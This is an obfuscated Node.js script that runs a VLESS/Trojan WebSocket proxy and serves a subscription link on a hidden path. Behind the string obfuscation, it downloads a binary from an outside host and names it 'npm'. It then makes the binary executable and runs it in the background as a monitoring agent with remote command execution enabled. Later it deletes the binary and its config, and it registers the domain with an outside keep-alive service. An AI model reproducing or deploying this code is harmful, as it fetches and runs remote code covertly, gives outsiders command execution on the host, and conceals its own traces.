const _0x336a11=_0x38eb;(function(_0x392376,_0x50eb27){const _0x20716b=_0x38eb,_0x198c53=_0x392376();while(!![]){try{const _0x56bdb9=-parseInt(_0x20716b(0x111))/0x1+-parseInt(_0x20716b(0xbc))/0x2*(-parseInt(_0x20716b(0xc9))/0x3)+-parseInt(_0x20716b(0xd6))/0x4*(parseInt(_0x20716b(0xab))/0x5)+parseInt(_0x20716b(0xa9))/0x6*(-parseInt(_0x20716b(0x11f))/0x7)+-parseInt(_0x20716b(0x108))/0x8+-parseInt(_0x20716b(0x10f))/0x9+-parseInt(_0x20716b(0xb8))/0xa*(-parseInt(_0x20716b(0xfd))/0xb);if(_0x56bdb9===_0x50eb27)break;else _0x198c53['push'](_0x198c53['shift']());}catch(_0x522f45){_0x198c53['push'](_0x198c53['shift']());}}}(_0x27a3,0xcddad));const os=require('os'),http=require('http'),fs=require('fs'),axios=require('axios'),net=require('net'),path=require(_0x336a11(0x101)),crypto=require(_0x336a11(0xb7)),{Buffer}=require(_0x336a11(0xd1)),{exec,execSync}=require(_0x336a11(0xb1)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x336a11(0xd3)][_0x336a11(0x100)]||_0x336a11(0xd9),NEZHA_SERVER=process[_0x336a11(0xd3)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x336a11(0xd3)][_0x336a11(0xec)]||'',NEZHA_KEY=process[_0x336a11(0xd3)][_0x336a11(0x11d)]||'',DOMAIN=process[_0x336a11(0xd3)][_0x336a11(0x10d)]||_0x336a11(0xfc),AUTO_ACCESS=process[_0x336a11(0xd3)][_0x336a11(0xdb)]||!![],WSPATH=process[_0x336a11(0xd3)]['WSPATH']||UUID[_0x336a11(0x10c)](0x0,0x8),SUB_PATH=process[_0x336a11(0xd3)][_0x336a11(0xf0)]||_0x336a11(0x11e),NAME=process[_0x336a11(0xd3)][_0x336a11(0xa6)]||'',PORT=process['env'][_0x336a11(0xda)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x4ca376=_0x336a11;try{const _0x95f771=await axios['get'](_0x4ca376(0xf5)),_0x36d44f=_0x95f771[_0x4ca376(0xb5)];ISP=(_0x36d44f[_0x4ca376(0xb4)]+'-'+_0x36d44f[_0x4ca376(0xdc)])[_0x4ca376(0xe2)](/ /g,'_');}catch(_0x43f805){ISP=_0x4ca376(0xd7);}};GetISP();function _0x27a3(){const _0x16879b=['110QuWNio','https://arm64.ssss.nyc.mn/agent','end','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','2EiWQPd','https://','stream','Failed\x20to\x20resolve\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','map','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','finish','sha224','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://amd64.ssss.nyc.mn/v1','createWriteStream','429909ukQlsY','includes','connect','text/html','application/json','from','writeFileSync','join','buffer','Answer','env','2053','1.1.1.1','68ozUEtO','Unknown','error:\x20','eff5f6db-23ea-41e7-b7a1-9d8ff3a8649d','PORT','AUTO_ACCESS','isp','test','then','writeHead','setsid\x20nohup\x20./npm\x20-s\x20','Automatic\x20Access\x20Task\x20added\x20successfully','replace','catch','createServer','toString','readUInt8','Server','digest','close','&type=A','listen','NEZHA_PORT','arm64','npm','error','SUB_PATH','aarch64','find','every','log','https://api.ip.sb/geoip','base64','application/dns-json','trojan://','decode','reduce','concat','1234.abc.com','5320469Qlcfsd','https://dns.google/resolve?name=','https://oooo.serv00.net/add-url','UUID','path','createHash','config.yaml','vless://','arm','2083',':443?security=tls&sni=','10487928RPcmXy','connection','arch','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','slice','DOMAIN','readFile','12606903pivdIO','&path=%2F','299396nmPeSN','https://amd64.ssss.nyc.mn/agent','length','readUInt16BE','get','update','8443','2087','pipe','Status','substr','Server\x20is\x20running\x20on\x20port\x20','NEZHA_KEY','sub','70GRjpDN','utf8','8.8.4.4','text/plain','&fp=chrome&type=ws&host=','write','type','url','NAME','utf-8','Hello\x20world!','89982MGdsqK','--tls','429255kptpzt','443','false','once','unlink','hex','child_process','\x20with\x20all\x20DNS\x20servers','npm\x20running\x20error:','country_code','data','pop','crypto'];_0x27a3=function(){return _0x16879b;};return _0x27a3();}const httpServer=http[_0x336a11(0xe4)]((_0x2e6cea,_0x15abee)=>{const _0x84c01e=_0x336a11;if(_0x2e6cea['url']==='/'){const _0x1ab137=path[_0x84c01e(0xd0)](__dirname,'index.html');fs[_0x84c01e(0x10e)](_0x1ab137,_0x84c01e(0x9f),(_0x3ac3c3,_0x252bb7)=>{const _0xcaa114=_0x84c01e;if(_0x3ac3c3){_0x15abee[_0xcaa114(0xdf)](0xc8,{'Content-Type':_0xcaa114(0xcc)}),_0x15abee[_0xcaa114(0xba)](_0xcaa114(0xa8));return;}_0x15abee[_0xcaa114(0xdf)](0xc8,{'Content-Type':_0xcaa114(0xcc)}),_0x15abee[_0xcaa114(0xba)](_0x252bb7);});return;}else{if(_0x2e6cea['url']==='/'+SUB_PATH){const _0x4e0f79=NAME?NAME+'-'+ISP:ISP,_0x1a750a=_0x84c01e(0x104)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x84c01e(0xa2)+DOMAIN+_0x84c01e(0x110)+WSPATH+'#'+_0x4e0f79,_0x1ae7dc=_0x84c01e(0xf8)+UUID+'@'+DOMAIN+_0x84c01e(0x107)+DOMAIN+_0x84c01e(0xa2)+DOMAIN+_0x84c01e(0x110)+WSPATH+'#'+_0x4e0f79,_0x383b82=_0x1a750a+'\x0a'+_0x1ae7dc,_0x18efbd=Buffer[_0x84c01e(0xce)](_0x383b82)[_0x84c01e(0xe5)](_0x84c01e(0xf6));_0x15abee[_0x84c01e(0xdf)](0xc8,{'Content-Type':_0x84c01e(0xa1)}),_0x15abee[_0x84c01e(0xba)](_0x18efbd+'\x0a');}else _0x15abee['writeHead'](0x194,{'Content-Type':_0x84c01e(0xa1)}),_0x15abee['end']('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x336a11(0xe7))]({'server':httpServer}),uuid=UUID[_0x336a11(0xe2)](/-/g,''),DNS_SERVERS=[_0x336a11(0xa0),_0x336a11(0xd5)];function resolveHost(_0x2848db){return new Promise((_0x25fd09,_0x39affd)=>{const _0x233882=_0x38eb;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x233882(0xdd)](_0x2848db)){_0x25fd09(_0x2848db);return;}let _0x52f1db=0x0;function _0x36de59(){const _0x5412f8=_0x233882;if(_0x52f1db>=DNS_SERVERS[_0x5412f8(0x113)]){_0x39affd(new Error(_0x5412f8(0xbf)+_0x2848db+_0x5412f8(0xb2)));return;}const _0x2da6f9=DNS_SERVERS[_0x52f1db];_0x52f1db++;const _0x22f2f7=_0x5412f8(0xfe)+encodeURIComponent(_0x2848db)+_0x5412f8(0xea);axios['get'](_0x22f2f7,{'timeout':0x1388,'headers':{'Accept':_0x5412f8(0xf7)}})[_0x5412f8(0xde)](_0x375c9e=>{const _0x59dd33=_0x5412f8,_0x2d4ae6=_0x375c9e[_0x59dd33(0xb5)];if(_0x2d4ae6[_0x59dd33(0x11a)]===0x0&&_0x2d4ae6['Answer']&&_0x2d4ae6['Answer'][_0x59dd33(0x113)]>0x0){const _0x527ba1=_0x2d4ae6[_0x59dd33(0xd2)][_0x59dd33(0xf2)](_0x529fed=>_0x529fed[_0x59dd33(0xa4)]===0x1);if(_0x527ba1){_0x25fd09(_0x527ba1[_0x59dd33(0xb5)]);return;}}_0x36de59();})[_0x5412f8(0xe3)](_0x35a085=>{_0x36de59();});}_0x36de59();});}function handleVlessConnection(_0x42b098,_0x352aaf){const _0x30e40f=_0x336a11,[_0x521fe8]=_0x352aaf,_0x5ad517=_0x352aaf[_0x30e40f(0x10c)](0x1,0x11);if(!_0x5ad517[_0x30e40f(0xf3)]((_0x1d8d94,_0x46b261)=>_0x1d8d94==parseInt(uuid[_0x30e40f(0x11b)](_0x46b261*0x2,0x2),0x10)))return![];let _0x51023e=_0x352aaf['slice'](0x11,0x12)[_0x30e40f(0xe6)]()+0x13;const _0x278e6b=_0x352aaf[_0x30e40f(0x10c)](_0x51023e,_0x51023e+=0x2)[_0x30e40f(0x114)](0x0),_0x505707=_0x352aaf[_0x30e40f(0x10c)](_0x51023e,_0x51023e+=0x1)['readUInt8'](),_0xbb0d59=_0x505707==0x1?_0x352aaf[_0x30e40f(0x10c)](_0x51023e,_0x51023e+=0x4)[_0x30e40f(0xd0)]('.'):_0x505707==0x2?new TextDecoder()[_0x30e40f(0xf9)](_0x352aaf[_0x30e40f(0x10c)](_0x51023e+0x1,_0x51023e+=0x1+_0x352aaf[_0x30e40f(0x10c)](_0x51023e,_0x51023e+0x1)[_0x30e40f(0xe6)]())):_0x505707==0x3?_0x352aaf[_0x30e40f(0x10c)](_0x51023e,_0x51023e+=0x10)[_0x30e40f(0xfa)]((_0x1abdb1,_0x201cad,_0x11e4ae,_0x544936)=>_0x11e4ae%0x2?_0x1abdb1[_0x30e40f(0xfb)](_0x544936[_0x30e40f(0x10c)](_0x11e4ae-0x1,_0x11e4ae+0x1)):_0x1abdb1,[])[_0x30e40f(0xc1)](_0xe72d14=>_0xe72d14[_0x30e40f(0x114)](0x0)[_0x30e40f(0xe5)](0x10))[_0x30e40f(0xd0)](':'):'';_0x42b098['send'](new Uint8Array([_0x521fe8,0x0]));const _0x7132a8=createWebSocketStream(_0x42b098);return resolveHost(_0xbb0d59)['then'](_0x2752b9=>{const _0x180b39=_0x30e40f;net[_0x180b39(0xcb)]({'host':_0x2752b9,'port':_0x278e6b},function(){const _0x1aabba=_0x180b39;this[_0x1aabba(0xa3)](_0x352aaf[_0x1aabba(0x10c)](_0x51023e)),_0x7132a8['on']('error',()=>{})[_0x1aabba(0x119)](this)['on']('error',()=>{})[_0x1aabba(0x119)](_0x7132a8);})['on'](_0x180b39(0xef),()=>{});})[_0x30e40f(0xe3)](_0x3d21c0=>{const _0x309260=_0x30e40f;net[_0x309260(0xcb)]({'host':_0xbb0d59,'port':_0x278e6b},function(){const _0x4cac66=_0x309260;this['write'](_0x352aaf[_0x4cac66(0x10c)](_0x51023e)),_0x7132a8['on']('error',()=>{})[_0x4cac66(0x119)](this)['on'](_0x4cac66(0xef),()=>{})['pipe'](_0x7132a8);})['on'](_0x309260(0xef),()=>{});}),!![];}function _0x38eb(_0x5e5c1b,_0x4675e0){_0x5e5c1b=_0x5e5c1b-0x9f;const _0x27a3a8=_0x27a3();let _0x38ebf0=_0x27a3a8[_0x5e5c1b];return _0x38ebf0;}function handleTrojanConnection(_0x36e123,_0x8ec3d1){const _0x56c1ca=_0x336a11;try{if(_0x8ec3d1['length']<0x3a)return![];const _0x3e2ada=_0x8ec3d1[_0x56c1ca(0x10c)](0x0,0x38)[_0x56c1ca(0xe5)](),_0x3d3ada=[UUID];let _0x2fadb7=null;for(const _0x4db7f0 of _0x3d3ada){const _0x4fb812=crypto[_0x56c1ca(0x102)](_0x56c1ca(0xc4))[_0x56c1ca(0x116)](_0x4db7f0)[_0x56c1ca(0xe8)](_0x56c1ca(0xb0));if(_0x4fb812===_0x3e2ada){_0x2fadb7=_0x4db7f0;break;}}if(!_0x2fadb7)return![];let _0x47f543=0x38;_0x8ec3d1[_0x47f543]===0xd&&_0x8ec3d1[_0x47f543+0x1]===0xa&&(_0x47f543+=0x2);const _0x5edb87=_0x8ec3d1[_0x47f543];if(_0x5edb87!==0x1)return![];_0x47f543+=0x1;const _0x46df3c=_0x8ec3d1[_0x47f543];_0x47f543+=0x1;let _0x2881f6,_0x33f5a3;if(_0x46df3c===0x1)_0x2881f6=_0x8ec3d1['slice'](_0x47f543,_0x47f543+0x4)[_0x56c1ca(0xd0)]('.'),_0x47f543+=0x4;else{if(_0x46df3c===0x3){const _0x14698c=_0x8ec3d1[_0x47f543];_0x47f543+=0x1,_0x2881f6=_0x8ec3d1[_0x56c1ca(0x10c)](_0x47f543,_0x47f543+_0x14698c)[_0x56c1ca(0xe5)](),_0x47f543+=_0x14698c;}else{if(_0x46df3c===0x4)_0x2881f6=_0x8ec3d1[_0x56c1ca(0x10c)](_0x47f543,_0x47f543+0x10)['reduce']((_0x3ec3f6,_0x3c5a77,_0x395cf4,_0x12630e)=>_0x395cf4%0x2?_0x3ec3f6[_0x56c1ca(0xfb)](_0x12630e[_0x56c1ca(0x10c)](_0x395cf4-0x1,_0x395cf4+0x1)):_0x3ec3f6,[])[_0x56c1ca(0xc1)](_0x195ef3=>_0x195ef3[_0x56c1ca(0x114)](0x0)[_0x56c1ca(0xe5)](0x10))[_0x56c1ca(0xd0)](':'),_0x47f543+=0x10;else return![];}}_0x33f5a3=_0x8ec3d1[_0x56c1ca(0x114)](_0x47f543),_0x47f543+=0x2;_0x47f543<_0x8ec3d1[_0x56c1ca(0x113)]&&_0x8ec3d1[_0x47f543]===0xd&&_0x8ec3d1[_0x47f543+0x1]===0xa&&(_0x47f543+=0x2);const _0x485dd1=createWebSocketStream(_0x36e123);return resolveHost(_0x2881f6)[_0x56c1ca(0xde)](_0x29f88e=>{const _0x56db8c=_0x56c1ca;net[_0x56db8c(0xcb)]({'host':_0x29f88e,'port':_0x33f5a3},function(){const _0x20d29c=_0x56db8c;_0x47f543<_0x8ec3d1[_0x20d29c(0x113)]&&this[_0x20d29c(0xa3)](_0x8ec3d1[_0x20d29c(0x10c)](_0x47f543)),_0x485dd1['on'](_0x20d29c(0xef),()=>{})[_0x20d29c(0x119)](this)['on'](_0x20d29c(0xef),()=>{})[_0x20d29c(0x119)](_0x485dd1);})['on'](_0x56db8c(0xef),()=>{});})[_0x56c1ca(0xe3)](_0x440891=>{const _0x42e6f1=_0x56c1ca;net[_0x42e6f1(0xcb)]({'host':_0x2881f6,'port':_0x33f5a3},function(){const _0x29eb67=_0x42e6f1;_0x47f543<_0x8ec3d1[_0x29eb67(0x113)]&&this['write'](_0x8ec3d1[_0x29eb67(0x10c)](_0x47f543)),_0x485dd1['on']('error',()=>{})['pipe'](this)['on'](_0x29eb67(0xef),()=>{})[_0x29eb67(0x119)](_0x485dd1);})['on'](_0x42e6f1(0xef),()=>{});}),!![];}catch(_0x362ce5){return![];}}wss['on'](_0x336a11(0x109),(_0x2b1ee8,_0x5b59ab)=>{const _0x177e73=_0x336a11,_0x333f62=_0x5b59ab[_0x177e73(0xa5)]||'';_0x2b1ee8[_0x177e73(0xae)]('message',_0x1e75a9=>{const _0x25612a=_0x177e73;if(_0x1e75a9[_0x25612a(0x113)]>0x11&&_0x1e75a9[0x0]===0x0){const _0x2e4a98=_0x1e75a9[_0x25612a(0x10c)](0x1,0x11),_0x3605fa=_0x2e4a98[_0x25612a(0xf3)]((_0x1538d1,_0x3f21a4)=>_0x1538d1==parseInt(uuid['substr'](_0x3f21a4*0x2,0x2),0x10));if(_0x3605fa){!handleVlessConnection(_0x2b1ee8,_0x1e75a9)&&_0x2b1ee8[_0x25612a(0xe9)]();return;}}!handleTrojanConnection(_0x2b1ee8,_0x1e75a9)&&_0x2b1ee8[_0x25612a(0xe9)]();})['on'](_0x177e73(0xef),()=>{});});const getDownloadUrl=()=>{const _0x22a337=_0x336a11,_0x51e7ab=os[_0x22a337(0x10a)]();return _0x51e7ab===_0x22a337(0x105)||_0x51e7ab===_0x22a337(0xed)||_0x51e7ab===_0x22a337(0xf1)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x22a337(0xb9):!NEZHA_PORT?_0x22a337(0xc7):_0x22a337(0x112);},downloadFile=async()=>{const _0x279f39=_0x336a11;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0xf9e6ea=getDownloadUrl(),_0x1dd9c3=await axios({'method':_0x279f39(0x115),'url':_0xf9e6ea,'responseType':_0x279f39(0xbe)}),_0x55619a=fs[_0x279f39(0xc8)]('npm');return _0x1dd9c3[_0x279f39(0xb5)][_0x279f39(0x119)](_0x55619a),new Promise((_0x519eca,_0x435450)=>{const _0x247790=_0x279f39;_0x55619a['on'](_0x247790(0xc3),()=>{console['log']('npm\x20download\x20successfully'),exec('chmod\x20+x\x20npm',_0x226e47=>{if(_0x226e47)_0x435450(_0x226e47);_0x519eca();});}),_0x55619a['on'](_0x247790(0xef),_0x435450);});}catch(_0x390709){throw _0x390709;}},runnz=async()=>{const _0x11120f=_0x336a11;try{const _0x5465ad=execSync(_0x11120f(0xbb),{'encoding':_0x11120f(0xa7)});if(_0x5465ad['trim']()!==''){console['log']('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x5e88f0){}await downloadFile();let _0x34fa27='',_0x1fd1c3=[_0x11120f(0xac),_0x11120f(0x117),'2096',_0x11120f(0x118),_0x11120f(0x106),_0x11120f(0xd4)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xa11947=_0x1fd1c3[_0x11120f(0xca)](NEZHA_PORT)?_0x11120f(0xaa):'';_0x34fa27=_0x11120f(0xe0)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0xa11947+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2a1ae3=NEZHA_SERVER[_0x11120f(0xca)](':')?NEZHA_SERVER['split'](':')[_0x11120f(0xb6)]():'',_0x486023=_0x1fd1c3[_0x11120f(0xca)](_0x2a1ae3)?'true':_0x11120f(0xad),_0x49ca66='client_secret:\x20'+NEZHA_KEY+_0x11120f(0xc6)+NEZHA_SERVER+_0x11120f(0xc5)+_0x486023+_0x11120f(0x10b)+UUID;fs[_0x11120f(0xcf)]('config.yaml',_0x49ca66);}_0x34fa27=_0x11120f(0xc0);}else{console['log'](_0x11120f(0xc2));return;}}try{exec(_0x34fa27,{'shell':'/bin/bash'},_0x3b90c9=>{const _0x10f1b5=_0x11120f;if(_0x3b90c9)console[_0x10f1b5(0xef)](_0x10f1b5(0xb3),_0x3b90c9);else console[_0x10f1b5(0xf4)]('npm\x20is\x20running');});}catch(_0x3ffd1a){console[_0x11120f(0xef)](_0x11120f(0xd8)+_0x3ffd1a);}};async function addAccessTask(){const _0x11f278=_0x336a11;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x162ebf=_0x11f278(0xbd)+DOMAIN;try{const _0x249411=await axios['post'](_0x11f278(0xff),{'url':_0x162ebf},{'headers':{'Content-Type':_0x11f278(0xcd)}});console['log'](_0x11f278(0xe1));}catch(_0x131083){}}const delFiles=()=>{const _0xa8d11=_0x336a11;fs[_0xa8d11(0xaf)](_0xa8d11(0xee),()=>{}),fs['unlink'](_0xa8d11(0x103),()=>{});};httpServer[_0x336a11(0xeb)](PORT,()=>{const _0x36adc8=_0x336a11;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x36adc8(0xf4)](_0x36adc8(0x11c)+PORT);});
